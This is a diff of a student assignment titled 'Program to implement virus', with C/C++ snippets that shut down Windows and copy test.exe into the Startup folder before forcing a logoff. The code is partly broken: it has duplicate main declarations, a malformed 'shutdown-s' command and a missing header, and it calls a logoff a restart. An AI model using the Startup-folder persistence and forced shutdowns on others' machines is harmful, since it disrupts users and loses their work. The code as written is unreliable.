@@ -1,8 +1,39 @@
-                  Assignment - 3     
-Program to implement virus       
- 
-1. Create Computer Virus using C to Restart Computer
 
+
+Aim-
+
+To create a program that can perform system shutdown and restart operations through command-line instructions.
+
+THEORY-
+
+The system shutdown and restart operations allow users to control their computer's power state. The shutdown command is a standard command-line utility in operating systems that can be used to turn off or restart the computer. In the context of programming, using system calls to execute these commands can automate these operations.
+Procedure
+Shutdown System:
+
+Use the system function from the C++ standard library to execute a shutdown command.
+The command used will shut down the system after a specified period or immediately.
+
+Restart System:
+
+Create a copy of a specified executable file (e.g., test.exe) into the Startup folder to ensure it runs upon the next login.
+Use the system function again to log off the current user, effectively restarting the system.
+
+
+
+Program to implement virus
+Shutdown system 
+
+#include<iostream>
+int main()
+void main(void)
+{
+    system("shutdown-s");
+}
+
+
+
+
+RESTART SYSTEM 
 
 #include<stdio.h>
 #include<dos.h>
@@ -11,17 +42,6 @@ int main()
 system("copy test.exe C:/Documents and Settings/All Users/Start Menu/Programs/Startup/");
 system("shutdown -l -f");
 }
-
-
-
-
-
-2. Shutdown Windows
-void main(void)
-{
-system(“shutdown-s”);
-}
-
 
 
 
